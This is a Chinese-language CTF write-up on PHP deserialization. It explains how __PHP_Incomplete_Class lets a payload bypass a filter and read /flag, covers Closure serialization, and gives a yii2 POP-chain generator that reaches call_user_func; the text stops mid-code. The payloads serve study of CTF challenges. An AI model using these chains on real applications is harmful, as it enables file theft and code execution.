<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604089.webp" alt="image-20230525160445811" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604089.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604089.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604089.webp?size=large 2x" data-title="image-20230525160445811" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>执行结果如下图</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604063.webp" alt="image-20230525160458811" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604063.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604063.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251604063.webp?size=large 2x" data-title="image-20230525160458811" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>可以看到在二次序列化后，由于<code>O:22:&quot;__PHP_Incomplete_Class&quot;:1:{s:1:&quot;a&quot;;O:7:&quot;classes&quot;:0:{}}</code>中<code>__PHP_Incomplete_Class_Name</code>为空，找不到应该绑定的类，其属性就被丢弃了，导致了<code>serialize(unserialize($x)) != $x</code>的出现。</p>
<h3 id="以强网杯2021-whereisuwebshell-为例" class="heading-element"><span>以强网杯2021 WhereIsUWebShell 为例</span>
  <a href="#%e4%bb%a5%e5%bc%ba%e7%bd%91%e6%9d%af2021-whereisuwebshell-%e4%b8%ba%e4%be%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>事实上，在2021强网杯中就有利用到这一点。</p>
<p>下面是需要进行绕过的代码，unserialize的时候这个类存在，再次serialize的时候_PHP_Incomplete_Class_Name为空，即找不到绑定的类，那么_PHP_Incomplete_Class类中的属性myclass也会被丢弃</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$res</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$_REQUEST</span>[<span style="color:#a6be9d">&#39;ctfer&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#58a1dd">preg_match</span>(<span style="color:#a6be9d">&#39;/myclass/i&#39;</span>,<span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$res</span>))){
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">throw</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Exception</span>(<span style="color:#a6be9d">&#34;Error: Class &#39;myclass&#39; not found &#34;</span>);
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>在这个题目中，我们需要加载<code>myclass.php</code>中的<code>hello</code>类，但是要引入hello类，根据<code>__autoload</code>我们需要一个<code>classname</code>为<code>myclass</code>的类，这个类并不存在，如果我们直接去反序列化，只会在反序列化myclass类的时候报错无法进入下一步，或者在反序列化Hello的时候找不到这个类而报错。</p>
<p>根据上面的分析，我们可以使用PHP对<code>__PHP_Incomplete_Class</code>的特殊处理进行绕过</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>a:2:{i:0;O:22:&#34;__PHP_Incomplete_Class&#34;:1:{s:3:&#34;qwb&#34;;O:7:&#34;myclass&#34;:0:{}}i:1;O:5:&#34;Hello&#34;:1:{s:3:&#34;qwb&#34;;s:5:&#34;/flag&#34;;}}</span></span></code></pre></div><p>修改一下<code>index.php</code>和<code>myclass.php</code>以便更好地看清这一过程</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// index.php
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">ini_set</span>(<span style="color:#a6be9d">&#39;display_errors&#39;</span>, <span style="color:#a6be9d">&#39;on&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">include</span> <span style="color:#a6be9d">&#34;function.php&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$res</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$_REQUEST</span>[<span style="color:#a6be9d">&#39;ctfer&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">$res</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#39;&lt;br&gt;&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$res</span>));
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#58a1dd">preg_match</span>(<span style="color:#a6be9d">&#39;/myclass/i&#39;</span>,<span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$res</span>))){
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;???&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">throw</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Exception</span>(<span style="color:#a6be9d">&#34;Error: Class &#39;myclass&#39; not found &#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">highlight_file</span>(<span style="color:#58a1dd">__FILE__</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">highlight_file</span>(<span style="color:#a6be9d">&#34;myclass.php&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">highlight_file</span>(<span style="color:#a6be9d">&#34;function.php&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;End&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// myclass.php
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//class myclass{}
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">Hello</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__destruct</span>()
</span></span><span style="display:flex;"><span>    {   
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;I&#39;m destructed.&lt;br/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">var_export</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">qwb</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">qwb</span>) <span style="color:#ff636f">echo</span> <span style="color:#58a1dd">file_get_contents</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">qwb</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251645826.webp" alt="image-20230525164515295" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251645826.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251645826.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305251645826.webp?size=large 2x" data-title="image-20230525164515295" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>可以看到在反序列化之后，myclass作为了<code>__PHP_Incomplete_Class</code>中属性，会触发autoload引入myclass.php，而对他进行二次序列化时，因为<code>__PHP_Incomplete_Class</code>没有<code>__PHP_Incomplete_Class_Name</code>该对象会消失，从而绕过<code>preg_match</code>的检测，并在最后触发<code>Hello</code>类的反序列化。</p>
<h1 id="闭包函数也能反序列化" class="heading-element"><span>(闭包)函数也能反序列化?</span>
  <a href="#%e9%97%ad%e5%8c%85%e5%87%bd%e6%95%b0%e4%b9%9f%e8%83%bd%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>Closure （闭包）函数也是类</p>
<p>在php中，除了通过<code>function(){}</code>定义函数并调用还可以通过如下方式</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$func</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">function</span>(<span style="color:#58a1dd">$b</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">$a</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">$b</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$func</span>(<span style="color:#a6be9d">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//Output:2
</span></span></span></code></pre></div><p>的方式调用函数，这是因为PHP在5.3版本引入了Closure类用于代表匿名函数</p>
<p>实际上$func就是一个Closure类型的对象，根据PHP官方文档，Closure类定义如下。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">Closure</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">/* 方法 */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">__construct</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#58a1dd">bind</span>(<span style="color:#58a1dd">Closure</span> <span style="color:#58a1dd">$closure</span>, <span style="color:#ff636f">?</span><span style="color:#58a1dd">object</span> <span style="color:#58a1dd">$newThis</span>, <span style="color:#58a1dd">object</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#ff636f">null</span> <span style="color:#58a1dd">$newScope</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;static&#34;</span>)<span style="color:#ff636f">:</span> <span style="color:#ff636f">?</span><span style="color:#58a1dd">Closure</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">bindTo</span>(<span style="color:#58a1dd">object</span> <span style="color:#58a1dd">$newthis</span>, <span style="color:#58a1dd">mixed</span> <span style="color:#58a1dd">$newscope</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;static&#39;</span>)<span style="color:#ff636f">:</span> <span style="color:#58a1dd">Closure</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">call</span>(<span style="color:#58a1dd">object</span> <span style="color:#58a1dd">$newThis</span>, <span style="color:#58a1dd">mixed</span> <span style="color:#ff636f">...</span><span style="color:#58a1dd">$args</span>)<span style="color:#ff636f">:</span> <span style="color:#58a1dd">mixed</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#58a1dd">fromCallable</span>(<span style="color:#58a1dd">callable</span> <span style="color:#58a1dd">$callback</span>)<span style="color:#ff636f">:</span> <span style="color:#58a1dd">Closure</span>
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>下面是一个简单的使用示例</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">Test</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$a</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(<span style="color:#58a1dd">$a</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">0</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">a</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$a</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">plus</span>(<span style="color:#58a1dd">$b</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">a</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">$b</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$funcInObject</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">function</span>(<span style="color:#58a1dd">$b</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;Test::Plus</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">Output:&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">plus</span>(<span style="color:#58a1dd">$b</span>)<span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">a</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">try</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$func</span>));
</span></span><span style="display:flex;"><span>}<span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">$e</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$e</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$myclosure</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">Closure</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">bind</span>(<span style="color:#58a1dd">$funcInObject</span>,<span style="color:#ff636f">new</span> <span style="color:#58a1dd">Test</span>(<span style="color:#a6be9d">123</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">$myclosure</span>(<span style="color:#a6be9d">1</span>));
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//Output:int(124)
</span></span></span></code></pre></div><p>可以看到通过<code>Closure::bind</code>我们还可以给闭包传入上下文对象。</p>
<p>一般来说Closure是不允许序列化和反序列化的，直接序列化会<code>Exception: Serialization of 'Closure' is not allowed</code></p>
<p>然而<a href="https://github.com/opis/closure"target="_blank" rel="external nofollow noopener noreferrer">Opi Closure (opens new window)</a>库实现了这一功能,通过Opi Clousre，我们可以方便的对闭包进行序列化反序列化，只需要使用<code>Opis\Closure\serialize()</code>和<code>Opis\Closure\unserialize()</code>即可。</p>
<p>==以祥云杯2021-ezyii为例以祥云杯2021 ezyii为例==</p>
<p>在2021祥云杯比赛中有一个关于yii2的反序列化链,根据所给的文件，很容易发现一条链子</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Runprocess-&gt;DefaultGenerator-&gt;AppendStream-&gt;CachingStream-&gt;PumpStream</span></span></code></pre></div><p>也即</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">namespace</span> <span style="color:#58a1dd">Faker</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">class</span> <span style="color:#58a1dd">DefaultGenerator</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">protected</span> <span style="color:#58a1dd">$default</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(<span style="color:#58a1dd">$default</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">default</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$default</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">namespace</span> <span style="color:#58a1dd">GuzzleHttp\Psr7</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">use</span> <span style="color:#58a1dd">Faker\DefaultGenerator</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">final</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">AppendStream</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$streams</span> <span style="color:#ff636f">=</span> [];
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$seekable</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">true</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(){
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">streams</span>[]<span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">CachingStream</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">final</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">CachingStream</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$remoteStream</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(){
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">remoteStream</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">DefaultGenerator</span>(<span style="color:#ff636f">false</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">stream</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span>  <span style="color:#58a1dd">PumpStream</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">final</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">PumpStream</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$source</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$size</span><span style="color:#ff636f">=-</span><span style="color:#a6be9d">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$buffer</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(){
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">buffer</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">DefaultGenerator</span>(<span style="color:#a6be9d">&#39;whatever&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">source</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;????&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">namespace</span> <span style="color:#58a1dd">Codeception\Extension</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">use</span> <span style="color:#58a1dd">Faker\DefaultGenerator</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">use</span> <span style="color:#58a1dd">GuzzleHttp\Psr7\AppendStream</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">class</span>  <span style="color:#58a1dd">RunProcess</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">protected</span> <span style="color:#58a1dd">$output</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$processes</span> <span style="color:#ff636f">=</span> [];
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(){
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">processes</span>[]<span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">DefaultGenerator</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">AppendStream</span>());
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">output</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">DefaultGenerator</span>(<span style="color:#a6be9d">&#39;whatever&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">namespace</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">use</span> <span style="color:#58a1dd">Codeception\Extension\RunProcess</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">echo</span> <span style="color:#58a1dd">base64_encode</span>(<span style="color:#58a1dd">serialize</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">RunProcess</span>()));
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>最后触发的是PumpStream::pump里的<code>call_user_func($this-&gt;source, $length);</code></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">PumpStream</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">pump</span>(<span style="color:#58a1dd">$length</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">var_dump</span>(<span style="color:#a6be9d">&#34;PumpStream::pump&#34;</span>,<span style="color:#58a1dd">$this</span>,<span style="color:#58a1dd">$length</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">source</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">do</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">$data</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">call_user_func</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">source</span>, <span style="color:#58a1dd">$length</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">$data</span> <span style="color:#ff636f">===</span> <span style="color:#ff636f">false</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">$data</span> <span style="color:#ff636f">===</span> <span style="color:#ff636f">null</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">source</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">null</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#ff636f">return</span>;
</span></span><span style="display:flex;"><span>                }
